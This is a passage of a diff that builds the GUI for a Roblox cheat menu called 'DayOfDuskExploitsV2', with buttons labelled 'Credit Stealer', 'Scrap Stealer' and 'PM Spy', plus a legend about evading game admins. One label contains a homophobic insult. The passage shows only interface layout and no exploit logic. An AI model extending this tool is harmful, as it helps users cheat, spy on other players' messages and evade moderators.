+DayOfDuskExploitsV2.InfoShort.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoShort.Position = UDim2.new(0.050999999, 0, 0.31400001, 0)
+DayOfDuskExploitsV2.InfoShort.Size = UDim2.new(0, 188, 0, 28)
+DayOfDuskExploitsV2.InfoShort.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoShort.Text = "If you see a symbol next to a button, refer to this to see what it means."
+DayOfDuskExploitsV2.InfoShort.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoShort.TextSize = 14.000
+DayOfDuskExploitsV2.InfoShort.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_17.Parent = DayOfDuskExploitsV2.InfoShort
+
+DayOfDuskExploitsV2.InfoDescription1.Name = "InfoDescription1"
+DayOfDuskExploitsV2.InfoDescription1.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoDescription1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoDescription1.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoDescription1.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.InfoDescription1.Position = UDim2.new(0.0412438363, 0, 0.42185542, 0)
+DayOfDuskExploitsV2.InfoDescription1.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.InfoDescription1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoDescription1.Text = "\"☢\"  = You will be teleported in a radiated zone when clicked."
+DayOfDuskExploitsV2.InfoDescription1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoDescription1.TextScaled = true
+DayOfDuskExploitsV2.InfoDescription1.TextSize = 14.000
+DayOfDuskExploitsV2.InfoDescription1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_18.Parent = DayOfDuskExploitsV2.InfoDescription1
+
+DayOfDuskExploitsV2.InfoLabel.Name = "InfoLabel"
+DayOfDuskExploitsV2.InfoLabel.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoLabel.Position = UDim2.new(0.050999999, 0, 0.181999996, 0)
+DayOfDuskExploitsV2.InfoLabel.Size = UDim2.new(0, 188, 0, 24)
+DayOfDuskExploitsV2.InfoLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoLabel.Text = "Information"
+DayOfDuskExploitsV2.InfoLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoLabel.TextScaled = true
+DayOfDuskExploitsV2.InfoLabel.TextSize = 14.000
+DayOfDuskExploitsV2.InfoLabel.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_19.Parent = DayOfDuskExploitsV2.InfoLabel
+
+DayOfDuskExploitsV2.InfoDescription2.Name = "InfoDescription2"
+DayOfDuskExploitsV2.InfoDescription2.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoDescription2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoDescription2.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoDescription2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.InfoDescription2.Position = UDim2.new(0.0412438363, 0, 0.513050377, 0)
+DayOfDuskExploitsV2.InfoDescription2.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.InfoDescription2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoDescription2.Text = "\"⚠️\" Means there is an increased chance an admin may be here when you teleport."
+DayOfDuskExploitsV2.InfoDescription2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoDescription2.TextScaled = true
+DayOfDuskExploitsV2.InfoDescription2.TextSize = 14.000
+DayOfDuskExploitsV2.InfoDescription2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_20.Parent = DayOfDuskExploitsV2.InfoDescription2
+
+DayOfDuskExploitsV2.InfoDescription3.Name = "InfoDescription3"
+DayOfDuskExploitsV2.InfoDescription3.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoDescription3.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoDescription3.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoDescription3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.InfoDescription3.Position = UDim2.new(0.0412438363, 0, 0.604245365, 0)
+DayOfDuskExploitsV2.InfoDescription3.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.InfoDescription3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoDescription3.Text = "\"✅\" Can be used as means of escape if an admin is about to catch you."
+DayOfDuskExploitsV2.InfoDescription3.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoDescription3.TextScaled = true
+DayOfDuskExploitsV2.InfoDescription3.TextSize = 14.000
+DayOfDuskExploitsV2.InfoDescription3.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_21.Parent = DayOfDuskExploitsV2.InfoDescription3
+
+DayOfDuskExploitsV2.InfoDescription4.Name = "InfoDescription4"
+DayOfDuskExploitsV2.InfoDescription4.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoDescription4.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoDescription4.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoDescription4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.InfoDescription4.Position = UDim2.new(0.0412438363, 0, 0.695440292, 0)
+DayOfDuskExploitsV2.InfoDescription4.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.InfoDescription4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoDescription4.Text = "\"🛑\" Means this place may get you shot up by a gay mdf."
+DayOfDuskExploitsV2.InfoDescription4.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoDescription4.TextScaled = true
+DayOfDuskExploitsV2.InfoDescription4.TextSize = 14.000
+DayOfDuskExploitsV2.InfoDescription4.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_22.Parent = DayOfDuskExploitsV2.InfoDescription4
+
+DayOfDuskExploitsV2.InfoDescription5.Name = "InfoDescription5"
+DayOfDuskExploitsV2.InfoDescription5.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.InfoDescription5.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoDescription5.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoDescription5.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.InfoDescription5.Position = UDim2.new(0.0412438363, 0, 0.78663528, 0)
+DayOfDuskExploitsV2.InfoDescription5.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.InfoDescription5.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoDescription5.Text = "\"❌\" Means this is not currently in use."
+DayOfDuskExploitsV2.InfoDescription5.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoDescription5.TextScaled = true
+DayOfDuskExploitsV2.InfoDescription5.TextSize = 14.000
+DayOfDuskExploitsV2.InfoDescription5.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_23.Parent = DayOfDuskExploitsV2.InfoDescription5
+
+DayOfDuskExploitsV2.SettingsFrame.Name = "SettingsFrame"
+DayOfDuskExploitsV2.SettingsFrame.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.SettingsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.SettingsFrame.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.SettingsFrame.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.SettingsFrame.Visible = false
+
+DayOfDuskExploitsV2.BackToMenuButton3.Name = "BackToMenuButton3"
+DayOfDuskExploitsV2.BackToMenuButton3.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.BackToMenuButton3.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.BackToMenuButton3.Position = UDim2.new(0.0456431322, 0, 0.905660391, 0)
+DayOfDuskExploitsV2.BackToMenuButton3.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.BackToMenuButton3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenuButton3.Text = "Back to menu"
+DayOfDuskExploitsV2.BackToMenuButton3.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.BackToMenuButton3.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_24.Parent = DayOfDuskExploitsV2.BackToMenuButton3
+
+DayOfDuskExploitsV2.SettingsShort.Name = "SettingsShort"
+DayOfDuskExploitsV2.SettingsShort.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.SettingsShort.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SettingsShort.Position = UDim2.new(0.050999999, 0, 0.31400001, 0)
+DayOfDuskExploitsV2.SettingsShort.Size = UDim2.new(0, 188, 0, 28)
+DayOfDuskExploitsV2.SettingsShort.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SettingsShort.Text = "Please remember settings do not save."
+DayOfDuskExploitsV2.SettingsShort.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SettingsShort.TextSize = 14.000
+DayOfDuskExploitsV2.SettingsShort.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_25.Parent = DayOfDuskExploitsV2.SettingsShort
+
+DayOfDuskExploitsV2.SettingsLabel.Name = "SettingsLabel"
+DayOfDuskExploitsV2.SettingsLabel.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.SettingsLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SettingsLabel.Position = UDim2.new(0.050999999, 0, 0.181999996, 0)
+DayOfDuskExploitsV2.SettingsLabel.Size = UDim2.new(0, 188, 0, 24)
+DayOfDuskExploitsV2.SettingsLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SettingsLabel.Text = "Settings"
+DayOfDuskExploitsV2.SettingsLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SettingsLabel.TextScaled = true
+DayOfDuskExploitsV2.SettingsLabel.TextSize = 14.000
+DayOfDuskExploitsV2.SettingsLabel.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_26.Parent = DayOfDuskExploitsV2.SettingsLabel
+
+DayOfDuskExploitsV2.CheckBox1.Name = "CheckBox1"
+DayOfDuskExploitsV2.CheckBox1.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.CheckBox1.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+DayOfDuskExploitsV2.CheckBox1.BorderSizePixel = 0
+DayOfDuskExploitsV2.CheckBox1.Position = UDim2.new(0.048780486, 0, 0.427672952, 0)
+DayOfDuskExploitsV2.CheckBox1.Size = UDim2.new(0, 20, 0, 20)
+
+DayOfDuskExploitsV2.CheckBoxFill1.Name = "CheckBoxFill1"
+DayOfDuskExploitsV2.CheckBoxFill1.Parent = DayOfDuskExploitsV2.CheckBox1
+DayOfDuskExploitsV2.CheckBoxFill1.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.CheckBoxFill1.BorderSizePixel = 0
+DayOfDuskExploitsV2.CheckBoxFill1.Position = UDim2.new(0, 1, 0, 1)
+DayOfDuskExploitsV2.CheckBoxFill1.Size = UDim2.new(0, 18, 0, 18)
+
+DayOfDuskExploitsV2.CheckButton1.Name = "CheckButton1"
+DayOfDuskExploitsV2.CheckButton1.Parent = DayOfDuskExploitsV2.CheckBox1
+DayOfDuskExploitsV2.CheckButton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CheckButton1.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CheckButton1.Position = UDim2.new(0, 2, 0, 2)
+DayOfDuskExploitsV2.CheckButton1.Size = UDim2.new(0, 16, 0, 16)
+DayOfDuskExploitsV2.CheckButton1.Image = "rbxassetid://5465668842"
+DayOfDuskExploitsV2.CheckButton1.ImageTransparency = 1.000
+
+DayOfDuskExploitsV2.CheckLabel1.Name = "CheckLabel1"
+DayOfDuskExploitsV2.CheckLabel1.Parent = DayOfDuskExploitsV2.CheckBox1
+DayOfDuskExploitsV2.CheckLabel1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CheckLabel1.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CheckLabel1.Position = UDim2.new(1, 0, 0, 0)
+DayOfDuskExploitsV2.CheckLabel1.Size = UDim2.new(0, 94, 0, 18)
+DayOfDuskExploitsV2.CheckLabel1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CheckLabel1.Text = "Mute Sounds"
+DayOfDuskExploitsV2.CheckLabel1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CheckLabel1.TextSize = 14.000
+
+DayOfDuskExploitsV2.CheckBox2.Name = "CheckBox2"
+DayOfDuskExploitsV2.CheckBox2.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.CheckBox2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+DayOfDuskExploitsV2.CheckBox2.BorderSizePixel = 0
+DayOfDuskExploitsV2.CheckBox2.Position = UDim2.new(0.048780486, 0, 0.509433985, 0)
+DayOfDuskExploitsV2.CheckBox2.Size = UDim2.new(0, 20, 0, 20)
+
+DayOfDuskExploitsV2.CheckBoxFill2.Name = "CheckBoxFill2"
+DayOfDuskExploitsV2.CheckBoxFill2.Parent = DayOfDuskExploitsV2.CheckBox2
+DayOfDuskExploitsV2.CheckBoxFill2.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.CheckBoxFill2.BorderSizePixel = 0
+DayOfDuskExploitsV2.CheckBoxFill2.Position = UDim2.new(0, 1, 0, 1)
+DayOfDuskExploitsV2.CheckBoxFill2.Size = UDim2.new(0, 18, 0, 18)
+
+DayOfDuskExploitsV2.CheckButton2.Name = "CheckButton2"
+DayOfDuskExploitsV2.CheckButton2.Parent = DayOfDuskExploitsV2.CheckBox2
+DayOfDuskExploitsV2.CheckButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CheckButton2.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CheckButton2.Position = UDim2.new(0, 2, 0, 2)
+DayOfDuskExploitsV2.CheckButton2.Size = UDim2.new(0, 16, 0, 16)
+DayOfDuskExploitsV2.CheckButton2.Image = "rbxassetid://5465668842"
+DayOfDuskExploitsV2.CheckButton2.ImageTransparency = 1.000
+
+DayOfDuskExploitsV2.CheckLabel2.Name = "CheckLabel2"
+DayOfDuskExploitsV2.CheckLabel2.Parent = DayOfDuskExploitsV2.CheckBox2
+DayOfDuskExploitsV2.CheckLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CheckLabel2.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CheckLabel2.Position = UDim2.new(1.35000002, 0, 0, 0)
+DayOfDuskExploitsV2.CheckLabel2.Size = UDim2.new(0, 57, 0, 18)
+DayOfDuskExploitsV2.CheckLabel2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CheckLabel2.Text = "Lock Gui"
+DayOfDuskExploitsV2.CheckLabel2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CheckLabel2.TextSize = 14.000
+
+DayOfDuskExploitsV2.Minimise.Name = "Minimise"
+DayOfDuskExploitsV2.Minimise.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.Minimise.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Minimise.Position = UDim2.new(0.05052118, 0, 0.63522017, 0)
+DayOfDuskExploitsV2.Minimise.Size = UDim2.new(0, 50, 0, 30)
+DayOfDuskExploitsV2.Minimise.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Minimise.Text = "-------"
+DayOfDuskExploitsV2.Minimise.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Minimise.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_27.Parent = DayOfDuskExploitsV2.Minimise
+
+DayOfDuskExploitsV2.Close.Name = "Close"
+DayOfDuskExploitsV2.Close.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.Close.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Close.Position = UDim2.new(0.05052118, 0, 0.754716992, 0)
+DayOfDuskExploitsV2.Close.Size = UDim2.new(0, 50, 0, 30)
+DayOfDuskExploitsV2.Close.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Close.Text = "X"
+DayOfDuskExploitsV2.Close.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Close.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_28.Parent = DayOfDuskExploitsV2.Close
+
+DayOfDuskExploitsV2.MinimiseLabel.Name = "MinimiseLabel"
+DayOfDuskExploitsV2.MinimiseLabel.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.MinimiseLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.MinimiseLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.MinimiseLabel.Position = UDim2.new(0.356097549, 0, 0.65408808, 0)
+DayOfDuskExploitsV2.MinimiseLabel.Size = UDim2.new(0, 60, 0, 18)
+DayOfDuskExploitsV2.MinimiseLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MinimiseLabel.Text = "Minimise Gui"
+DayOfDuskExploitsV2.MinimiseLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MinimiseLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.CloseLabel.Name = "CloseLabel"
+DayOfDuskExploitsV2.CloseLabel.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.CloseLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CloseLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CloseLabel.Position = UDim2.new(0.326829284, 0, 0.773584962, 0)
+DayOfDuskExploitsV2.CloseLabel.Size = UDim2.new(0, 57, 0, 18)
+DayOfDuskExploitsV2.CloseLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CloseLabel.Text = "Close Gui"
+DayOfDuskExploitsV2.CloseLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CloseLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.MiscFrame.Name = "MiscFrame"
+DayOfDuskExploitsV2.MiscFrame.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.MiscFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.MiscFrame.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.MiscFrame.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.MiscFrame.Visible = false
+
+DayOfDuskExploitsV2.CreditGrab.Name = "CreditGrab"
+DayOfDuskExploitsV2.CreditGrab.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.CreditGrab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.CreditGrab.Position = UDim2.new(0.0926393121, 0, 0.608640492, 0)
+DayOfDuskExploitsV2.CreditGrab.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.CreditGrab.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CreditGrab.Text = "Credit Stealer"
+DayOfDuskExploitsV2.CreditGrab.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CreditGrab.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_29.Parent = DayOfDuskExploitsV2.CreditGrab
+
+DayOfDuskExploitsV2.Time.Name = "Time"
+DayOfDuskExploitsV2.Time.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.Time.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Time.Position = UDim2.new(0.0926393121, 0, 0.46640867, 0)
+DayOfDuskExploitsV2.Time.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.Time.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Time.Text = "Time (Press \"K\" to update)"
+DayOfDuskExploitsV2.Time.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Time.TextSize = 14.000
+DayOfDuskExploitsV2.Time.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_30.Parent = DayOfDuskExploitsV2.Time
+
+DayOfDuskExploitsV2.PMSpy.Name = "PMSpy"
+DayOfDuskExploitsV2.PMSpy.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.PMSpy.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.PMSpy.Position = UDim2.new(0.0926393121, 0, 0.328246474, 0)
+DayOfDuskExploitsV2.PMSpy.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.PMSpy.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PMSpy.Text = "PM Spy"
+DayOfDuskExploitsV2.PMSpy.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.PMSpy.TextSize = 14.000
+DayOfDuskExploitsV2.PMSpy.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_31.Parent = DayOfDuskExploitsV2.PMSpy
+
+DayOfDuskExploitsV2.MiscLabel.Name = "MiscLabel"
+DayOfDuskExploitsV2.MiscLabel.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.MiscLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MiscLabel.Position = UDim2.new(0.0412438363, 0, 0.156842798, 0)
+DayOfDuskExploitsV2.MiscLabel.Size = UDim2.new(0, 188, 0, 21)
+DayOfDuskExploitsV2.MiscLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MiscLabel.Text = "Miscellaneous Scripts"
+DayOfDuskExploitsV2.MiscLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MiscLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_32.Parent = DayOfDuskExploitsV2.MiscLabel
+
+DayOfDuskExploitsV2.BackToMenu4.Name = "BackToMenu4"
+DayOfDuskExploitsV2.BackToMenu4.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.BackToMenu4.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu4.Position = UDim2.new(0.0851462781, 0, 0.880976558, 0)
+DayOfDuskExploitsV2.BackToMenu4.Size = UDim2.new(0, 169, 0, 22)
+DayOfDuskExploitsV2.BackToMenu4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu4.Text = "Back to menu"
+DayOfDuskExploitsV2.BackToMenu4.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu4.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_33.Parent = DayOfDuskExploitsV2.BackToMenu4
+
+DayOfDuskExploitsV2.NotInUse2.Name = "NotInUse2"
+DayOfDuskExploitsV2.NotInUse2.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.NotInUse2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.NotInUse2.Position = UDim2.new(0.0900243297, 0, 0.751700819, 0)
+DayOfDuskExploitsV2.NotInUse2.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.NotInUse2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NotInUse2.Text = "❌"
+DayOfDuskExploitsV2.NotInUse2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.NotInUse2.TextSize = 14.000
+DayOfDuskExploitsV2.NotInUse2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_34.Parent = DayOfDuskExploitsV2.NotInUse2
+
+DayOfDuskExploitsV2.AnimGui.Name = "AnimGui"
+DayOfDuskExploitsV2.AnimGui.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.AnimGui.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.AnimGui.Position = UDim2.new(0.527522087, 0, 0.608640492, 0)
+DayOfDuskExploitsV2.AnimGui.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.AnimGui.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.AnimGui.Text = "Animation Gui"
+DayOfDuskExploitsV2.AnimGui.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.AnimGui.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_35.Parent = DayOfDuskExploitsV2.AnimGui
+
+DayOfDuskExploitsV2.ScrapGrab.Name = "ScrapGrab"
+DayOfDuskExploitsV2.ScrapGrab.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.ScrapGrab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ScrapGrab.Position = UDim2.new(0.527522087, 0, 0.46640867, 0)
+DayOfDuskExploitsV2.ScrapGrab.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.ScrapGrab.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ScrapGrab.Text = "Scrap Stealer"
+DayOfDuskExploitsV2.ScrapGrab.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ScrapGrab.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_36.Parent = DayOfDuskExploitsV2.ScrapGrab
+
+DayOfDuskExploitsV2.NotInUse1.Name = "NotInUse1"
+DayOfDuskExploitsV2.NotInUse1.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.NotInUse1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.NotInUse1.Position = UDim2.new(0.52490741, 0, 0.751700819, 0)
+DayOfDuskExploitsV2.NotInUse1.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.NotInUse1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NotInUse1.Text = "❌"
+DayOfDuskExploitsV2.NotInUse1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.NotInUse1.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_37.Parent = DayOfDuskExploitsV2.NotInUse1
+
+DayOfDuskExploitsV2.Reviz.Name = "Reviz"
+DayOfDuskExploitsV2.Reviz.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.Reviz.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Reviz.Position = UDim2.new(0.527522087, 0, 0.328246474, 0)
+DayOfDuskExploitsV2.Reviz.Size = UDim2.new(0, 80, 0, 35)
+DayOfDuskExploitsV2.Reviz.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Reviz.Text = "❌"
+DayOfDuskExploitsV2.Reviz.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Reviz.TextScaled = true
+DayOfDuskExploitsV2.Reviz.TextSize = 14.000
+DayOfDuskExploitsV2.Reviz.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_38.Parent = DayOfDuskExploitsV2.Reviz
+
+DayOfDuskExploitsV2.MiscShort.Name = "MiscShort"
+DayOfDuskExploitsV2.MiscShort.Parent = DayOfDuskExploitsV2.MiscFrame
+DayOfDuskExploitsV2.MiscShort.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MiscShort.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.MiscShort.Position = UDim2.new(0.0412438363, 0, 0.222880527, 0)
+DayOfDuskExploitsV2.MiscShort.Size = UDim2.new(0, 188, 0, 33)
+DayOfDuskExploitsV2.MiscShort.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MiscShort.Text = "Here are some useful scripts."
+DayOfDuskExploitsV2.MiscShort.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MiscShort.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_39.Parent = DayOfDuskExploitsV2.MiscShort
+
+DayOfDuskExploitsV2.TeleportFrame.Name = "TeleportFrame"
